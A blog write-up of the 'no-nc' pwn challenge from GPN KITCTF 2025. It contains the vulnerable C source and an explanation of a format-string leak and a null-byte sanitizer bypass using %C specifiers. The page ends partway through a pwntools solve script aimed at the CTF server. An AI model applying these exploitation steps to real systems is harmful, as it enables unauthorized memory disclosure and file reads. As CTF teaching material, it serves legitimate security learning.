<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/ctf/writeup10/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content=" GPN KITCTF 2025 - CTF Writeup"><meta property="og:description" content=" This game was developed, hosted and released by KITCTF !!* "><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-06-22T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content=" GPN KITCTF 2025 - CTF Writeup"><meta name=twitter:description content=" This game was developed, hosted and released by KITCTF !!* "><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="hacking articles,hacking articles blog,hacking articles tutorials,hacking articles writeups,ethical hacking articles,cybersecurity articles,security hacking articles,penetration testing articles,infosec articles,cyber security hacking articles,cybersecurity,ethical hacking,CTF writeups,penetration testing,security research,bug bounty,offensive security,infosec,hackthebox,web exploitation,havoc,Richie havoc,htb,learn ethical hacking,hacking tutorials for beginners,cybersecurity tutorials,how to hack ethically,penetration testing course,security researcher blog,hacking step by step guide,ethical hacking examples,real world hacking scenarios,practical hacking exercises,Hercules,Soulmate,Darkcorp,Darkzero,Writeup,Bugbounty,htb writeups,hackthebox walkthrough,hackthebox solutions,penetration testing tutorials,linux privilege escalation,windows privilege escalation,active directory hacking,OSCP preparation,cyber security blog,vulnerability research,exploit development,reverse engineering,binary exploitation,pwn challenges,web security,network security,cryptography challenges,tryhackme,offsec labs,BoardLight HTB,Instant HTB,Sea HTB,Cicada HTB,Intuition HTB,Sightless HTB,Editorial HTB,Runner HTB,Greenhorn HTB,Blazorized HTB,Surveillance HTB,Headless HTB,Crafty HTB,Bizness HTB,Mist HTB,Usage HTB,Perfection HTB,Builder HTB,WifineticTwo HTB,Cap HTB,Analysis HTB,Keeper HTB,ctf challenges,capture the flag,cyber defense,red team operations,blue team defense,malware analysis,forensics challenges,steganography,OSINT techniques,kali linux tutorials,metasploit framework,burp suite tutorials,nmap scanning,sql injection,xss exploitation,privilege escalation techniques,buffer overflow,rop chain,shellcode development,reverse shell,web shell,docker security,kubernetes pentesting,cloud security,aws security,azure pentesting,api security testing,jwt exploitation,owasp top 10,security certifications,CEH preparation,OSWE preparation,OSCE preparation,NanoCorp HTB,NanoCorp walkthrough,NanoCorp writeup,NanoCorp HTB writeup,HTB NanoCorp exploitation,HTB NanoCorp solution,HackTheBox NanoCorp,NTLM relay attacks,NTLM relay exploitation,responder NTLM relay,ntlmrelayx tutorial,windows active directory exploitation,windows privilege escalation techniques,windows enumeration techniques,SMB relay attacks,credential discovery techniques,hard difficulty HTB machines,advanced windows hacking,active directory pentesting guide,windows security assessment,windows post exploitation,domain controller exploitation,kerberos attacks,pass the hash,lateral movement techniques,bloodhound enumeration,impacket tools,windows pentesting,HTB hard machines 2025,HTB season 9 machines,advanced AD attacks,HTB NanoCorp writeup,HTB NanoCorp Machine writeup,nanocorp.htb,CVE-2025-24071,HTB NanoCorp exploitation,DCOM exploitation,Windows DCOM attacks,DACL Abuse,best hacking articles website,top cybersecurity writeup blogs,where to find CTF writeups,detailed penetration testing tutorials,comprehensive hacking guides,step by step hacking tutorials,beginner to advanced ethical hacking,free hacking learning resources,cybersecurity blog 2025,latest hacking techniques,modern exploitation methods,practical security research,how to solve CTF challenges,how to hack hackthebox machines,privilege escalation methods explained,web application security testing,how to find vulnerabilities,penetration testing methodology,OSCP exam preparation tips,HTB machine walkthrough,CTF challenge solutions,security assessment guide,metasploit tutorials,burp suite guides,nmap cheat sheet,gobuster usage,hydra brute force,sqlmap injection,netcat reverse shell,wireshark packet analysis,john the ripper tutorial,hashcat cracking guide,OSCP certification preparation,CEH study materials,bug bounty hunter tips,cybersecurity career guide,penetration tester roadmap,ethical hacker certification,security researcher career path,infosec job preparation,2025 hacking tutorials,latest CVE exploits,zero day vulnerabilities,current cybersecurity threats,modern web exploitation,cloud security testing,API security vulnerabilities,container security hacking,AI security research,machine learning vulnerabilities,alternative to ippsec,similar to hackingarticles,best ctf writeup sites,top penetration testing blogs,ethical hacking resources,cybersecurity learning platforms,hacking practice labs,hacking community,infosec community blog,cybersecurity forum,ethical hacking discord,CTF community,bug bounty community,security researchers network"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/ctf/writeup10/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/ctf/writeup10/"><meta property="og:title" content=" GPN KITCTF 2025 - CTF Writeup"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-06-22T00:00:00Z"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="article:author" content="Richie-Havoc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/ctf/writeup10/"><meta name=twitter:title content=" GPN KITCTF 2025 - CTF Writeup"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="ctf"><meta name=article:subtitle content=" A writeup for the GPN KITCTF 2025 CTF challenges that I managed to solve."><meta name=article:summary content="* This game was developed, hosted and released by KITCTF !!*"><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content=" GPN KITCTF 2025 - CTF Writeup"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Ctf","item":"https:\/\/havocsec.me\/ctf/"},{"@type":"ListItem","position":3,"name":" GPN KITCTF 2025 - CTF Writeup","item":"https:\/\/havocsec.me\/ctf\/writeup10\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
</button>
<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">GPN KITCTF 2025 - CTF Writeup</h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">A writeup for the GPN KITCTF 2025 CTF challenges that I managed to solve.</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Jun 22, 2025 - 12 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/cover_hu9cbe3e32bf78c2305713f8e131c768e0_54604_filter_11492400015018413633.webp alt="feature image" height=302 width=736>
<span class="mb-4 mt-1 text-center text-sm text-slate-700 dark:text-slate-200">ctf</span></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><h1 id=no-nc>no-nc</h1><p>This chall was under pwn but it brewed chaos.</p><p><img src="https://yawb.gitbook.io/~gitbook/image?url=https%3A%2F%2F1200844871-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Ft0CErfcYJSKkv4naX3IG%252Fuploads%252FvX8fOW6UlgelEMZvBdpF%252Fimage.png%3Falt%3Dmedia%26token%3D65515f37-fef4-44f1-88e8-552f1701a610&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=7c1dfdc5&amp;sv=2" alt></p><p>This is how i solved it with my buddy chat-gpt great assist ,we did it.you deserve the credit.was that awkward <em><strong>(laughs)</strong></em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Havoc@kali:~/play/no_nc/no-nc$ checksec nc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/nikifkon/play/no_nc/no-nc/nc&#39;</span>
</span></span><span style=display:flex><span>    Arch:       amd64-64-little
</span></span><span style=display:flex><span>    RELRO:      Partial RELRO
</span></span><span style=display:flex><span>    Stack:      No canary found
</span></span><span style=display:flex><span>    NX:         NX enabled
</span></span><span style=display:flex><span>    PIE:        PIE enabled
</span></span><span style=display:flex><span>    Stripped:   No
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define RAW_FLAG &#34;GPNCTF{fake_flag}&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>FLAG <span style=color:#f92672>=</span> RAW_FLAG;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>no</span>(<span style=color:#66d9ef>char</span> c)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;.&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;c&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> filebuf[<span style=color:#ae81ff>4096</span>] <span style=color:#f92672>=</span> {};
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setbuf</span>(stdin, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setbuf</span>(stdout, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setbuf</span>(stderr, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>200</span>] <span style=color:#f92672>=</span> {};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Give me a file to read&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>read</span>(STDIN_FILENO, buf, (<span style=color:#66d9ef>sizeof</span> buf) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    buf[<span style=color:#66d9ef>sizeof</span> buf <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>size_t</span> str_len <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(buf);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>size_t</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> str_len; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>no</span>(buf[i]))
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;I don&#39;t like your character!&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>filename <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>200</span>, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>snprintf</span>(filename, (<span style=color:#66d9ef>sizeof</span> filename) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>, buf);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Will open:&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(filename);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(filename, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;open&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> count <span style=color:#f92672>=</span> <span style=color:#a6e22e>read</span>(fd, filebuf, (<span style=color:#66d9ef>sizeof</span> filebuf) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (count <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>write</span>(STDOUT_FILENO, filebuf, count);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This program implement <code>cat</code> , except it take filename from STDIN and sanitize it with <code>int no(char c)</code>.</p><h2 id=what-our-goal><em>What our goal?</em></h2><ul><li><p>read flag from memory</p></li><li><p>bypass sanitizer and read binary (btw binary named is <code>nc</code>)</p></li></ul><h2 id=finding-vulnerability>Finding vulnerability</h2><p>This step was straightforward for me: my IDE showed me something cooler and juicy!!!</p><p><img src="https://yawb.gitbook.io/~gitbook/image?url=https%3A%2F%2F1200844871-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Ft0CErfcYJSKkv4naX3IG%252Fuploads%252FYKC8lizd5fgn3JUp0wCj%252Fimage.png%3Falt%3Dmedia%26token%3Da0d1fa9a-e447-42de-b4b1-cf576ac076c8&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=6b9124ae&amp;sv=2" alt></p><p>warning from clangd extension for VSCode</p><h2 id=exploiting>Exploiting.</h2><p>Can we leak the flag?</p><pre tabindex=0><code>read(STDIN_FILENO, buf, (sizeof buf) - 1);
...
snprintf(filename, (sizeof filename) - 1, buf);
puts(filename);
</code></pre><p>This fragment give up ability to leak:</p><ul><li><p><code>rcx</code>, <code>r8</code>, and <code>r9</code> registers</p></li><li><p>memory from stack below <code>buf</code></p></li><li><p>memory pointed from 2 above items (with <code>%s</code>)</p></li></ul><p>We might want to create pointer to FLAG inside <code>buf</code> but with PIE enabled we don&rsquo;t have address of <code>FLAG</code>.</p><p>So lets try to</p><h2 id=exploiting-by-bypass-sanitizer>Exploiting by Bypass sanitizer</h2><p>Another vulnerability:</p><p>Program only sanitize characters before first null byte:</p><pre tabindex=0><code>read(STDIN_FILENO, buf, (sizeof buf) - 1);
buf[sizeof buf - 1] = &#39;\0&#39;;
size_t str_len = strlen(buf);
for (size_t i = 0; i &lt; str_len; i++)
{
    if (no(buf[i]))
</code></pre><p>So we can place <code>n</code> and <code>c</code> character after null byte and reference it from beginning of string using <code>%C</code> (alias to forbidden <code>%lc</code>):</p><p><img src="https://yawb.gitbook.io/~gitbook/image?url=https%3A%2F%2F1200844871-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Ft0CErfcYJSKkv4naX3IG%252Fuploads%252FkuBPxPt0wIvhzM5eInuX%252Fimage.png%3Falt%3Dmedia%26token%3Db60ffd4e-f5e8-424d-aa52-3b2da362f5ab&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=1cb87272&amp;sv=2" alt></p><p><strong>final payload</strong></p><p>To correctly choice argument position we need to know that</p><ul><li><p>there 6 slots for arguments in registers: rdi, rsi, rdx, rcx, r8, and r9.</p></li><li><p>Other arguments layout on stack: <code>rsp</code>, <code>rsp+0x8</code>, <code>rsp+0x10</code>, and so on.</p></li><li><p>Indexing starting from 0.</p></li><li><p>⇒ Argument at <code>rsp</code> has index <code>6</code>.</p></li><li><p>⇒ Argument at <code>rsp+8*x</code> has index rsp <code>6 + x</code></p></li></ul><p>For example, char <code>c</code> in our payload has address <code>rsp+0x18</code> (because <code>rsp = &amp;buf</code>) therefor it has index 6 + 3 = 9</p><p><em><strong>Solve script (generalized for any filename)</strong></em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pathlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> pwn
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pwn<span style=color:#f92672>.</span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> elf <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>ELF(<span style=color:#e6db74>&#34;./nc&#34;</span>)
</span></span><span style=display:flex><span>gdbscript <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;b snprintf&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;c&#34;</span>,
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_tube</span>() <span style=color:#f92672>-&gt;</span> pwn<span style=color:#f92672>.</span>tube:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> pwn<span style=color:#f92672>.</span>args[<span style=color:#e6db74>&#39;REMOTE&#39;</span>]:
</span></span><span style=display:flex><span>        io <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>remote(<span style=color:#e6db74>&#34;springside-of-hyper-extreme-liberty.gpn23.ctf.kitctf.de&#34;</span>, <span style=color:#e6db74>&#34;443&#34;</span>, ssl<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> pwn<span style=color:#f92672>.</span>args[<span style=color:#e6db74>&#39;GDB&#39;</span>]:
</span></span><span style=display:flex><span>        io <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>debug(gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>join(gdbscript))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        io <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>process()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> get_tube()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>readline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>filename <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;nc&#34;</span>
</span></span><span style=display:flex><span>
